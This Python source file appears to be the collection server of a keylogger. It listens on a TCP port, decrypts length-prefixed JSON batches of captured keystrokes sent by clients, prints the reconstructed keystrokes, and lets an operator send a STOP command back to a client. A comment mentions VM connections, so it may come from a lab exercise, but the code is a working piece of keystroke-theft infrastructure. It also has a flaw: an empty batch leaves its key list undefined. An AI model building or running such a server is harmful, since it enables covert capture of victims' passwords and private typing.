import socket
import struct
import json
import threading
from encryption import decrypt_data, encrypt_data

HOST = "127.0.0.1"   # Allow external VM connections
PORT = 5000

shutdown_event = threading.Event()
send_stop_flag = threading.Event()


# -------------------------------------------------
# Utility: Receive exact number of bytes
# -------------------------------------------------
def receive_exact(sock, length):
    data = b""
    while len(data) < length:
        packet = sock.recv(length - len(data))
        if not packet:
            return None
        data += packet
    return data


# -------------------------------------------------
# CLI Listener Thread
# -------------------------------------------------
def listen_for_commands():
    print("\n[CLI Commands]")
    print("  stop  -> Send STOP to next client")
    print("  exit  -> Shutdown server\n")

    while not shutdown_event.is_set():
        cmd = input("> ").strip().lower()

        if cmd == "stop":
            print("[!] STOP command queued.")
            send_stop_flag.set()

        elif cmd == "exit":
            print("[!] Server shutdown initiated.")
            shutdown_event.set()

        else:
            print("[!] Unknown command.")


# -------------------------------------------------
# Main Server Logic
# -------------------------------------------------
def start_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
        server.bind((HOST, PORT))
        server.listen(5)

        print(f"[+] Server listening on {HOST}:{PORT}")

        # Start CLI command thread
        threading.Thread(target=listen_for_commands, daemon=True).start()

        while not shutdown_event.is_set():
            try:
                server.settimeout(1)
                client_socket, addr = server.accept()
            except socket.timeout:
                continue

            print(f"[+] Connection from {addr}")

            with client_socket:
                try:
                    # Step 1: Receive length
                    raw_length = receive_exact(client_socket, 4)
                    if not raw_length:
                        print("[!] No length received.")
                        continue

                    message_length = struct.unpack(">I", raw_length)[0]

                    # Step 2: Receive encrypted payload
                    encrypted_payload = receive_exact(client_socket, message_length)
                    if not encrypted_payload:
                        print("[!] Empty encrypted payload.")
                        continue

                    # Step 3: Decrypt
                    decrypted_data = decrypt_data(encrypted_payload)
                    decoded = decrypted_data.decode()

                    # Step 4: Parse JSON safely
                    try:
                        parsed = json.loads(decoded)
                    except json.JSONDecodeError:
                        print("[!] Invalid JSON received.")
                        continue

                   

                    if not parsed or not parsed.get("data"):
                        print("[!] Empty batch received.")
                        response = {"command" : "ACK"}
                    else:
                        print(f"[+] Received {len(parsed['data'])} keystrokes:")

                        keys = []
                        for item in parsed["data"]:
                            if isinstance(item, dict):
                                key_value = item.get("key", "")
                                if key_value.startswith("Key."):
                                    key_value = f"<{key_value.replace('Key.','')}>"
                                keys.append(key_value)
                            else:
                                keys.append(str(item))
            
                    print("".join(keys))

                    response = {"command": "ACK"}

                    # -------------------------------------------------
                    # Send Response (ACK or STOP)
                    # -------------------------------------------------
                    if send_stop_flag.is_set():
                        response = {"command": "STOP"}
                        send_stop_flag.clear()
                        print("[!] STOP sent to client.")
                    else:
                        response = {"command": "ACK"}

                    response_bytes = json.dumps(response).encode()
                    encrypted_response = encrypt_data(response_bytes)
                    response_message = struct.pack(">I", len(encrypted_response)) + encrypted_response

                    client_socket.sendall(response_message)

                except Exception as e:
                    print(f"[!] Error handling client: {e}")

    print("[+] Server shut down cleanly.")


if __name__ == "__main__":
    start_server()
